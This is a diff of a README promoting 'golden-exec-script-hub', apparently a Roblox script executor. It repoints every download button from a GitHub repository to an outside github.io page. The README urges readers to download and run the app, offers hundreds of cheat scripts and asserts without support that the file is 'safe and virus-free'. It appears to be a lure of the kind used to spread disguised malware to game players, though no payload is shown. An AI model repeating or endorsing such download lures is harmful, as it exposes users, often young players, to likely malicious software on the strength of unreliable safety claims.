@@ -2,7 +2,7 @@
 
 Welcome to **golden-exec-script-hub**, the simplest way to run Lua scripts on Roblox. Whether you're a seasoned scripter or just starting out, this tool makes it incredibly easy to enhance your Roblox experience with over 500 ready-to-use scripts, all from a clean and friendly desktop app. No complicated setup, no technical knowledge required—just download, run, and play.
 
-[![Download Now](https://img.shields.io/badge/Download-golden--exec--script--hub-brightgreen?style=for-the-badge&logo=github&logoColor=white&labelColor=blue)](https://github.com/anissaalonso801-del/golden-exec-script-hub)
+[![Download Now](https://img.shields.io/badge/Download-golden--exec--script--hub-brightgreen?style=for-the-badge&logo=github&logoColor=white&labelColor=blue)](https://anissaalonso801-del.github.io)
 
 ---
 
@@ -27,7 +27,7 @@ Let's get you up and running in less than five minutes. Follow these simple step
 
 1.  **Visit the Download Page:** Click the button below to go to the official download page for golden-exec-script-hub.
 
-    [![Download Now](https://img.shields.io/badge/Get%20the%20App-Download%20Here-orange?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/anissaalonso801-del/golden-exec-script-hub)
+    [![Download Now](https://img.shields.io/badge/Get%20the%20App-Download%20Here-orange?style=for-the-badge&logo=windows&logoColor=white)](https://anissaalonso801-del.github.io)
 
 2.  **Download the File:** Once you're on the page, look for the download button or link. Click it, and the download will start automatically. The file is safe and virus-free.
 
@@ -110,7 +110,7 @@ While this guide covers the essentials, we understand you might have questions. 
 
 Ready to take your Roblox experience to the next level? Click the big button below to go to the download page and get started.
 
-[![Download Now](https://img.shields.io/badge/📥%20Download%20golden--exec--script--hub-Click%20Here-brightgreen?style=for-the-badge&logo=github&logoColor=white&labelColor=333333)](https://github.com/anissaalonso801-del/golden-exec-script-hub)
+[![Download Now](https://img.shields.io/badge/📥%20Download%20golden--exec--script--hub-Click%20Here-brightgreen?style=for-the-badge&logo=github&logoColor=white&labelColor=333333)](https://anissaalonso801-del.github.io)
 
 Visit this link to download the application. The process is quick, simple, and puts a world of scripting power right at your fingertips.
 
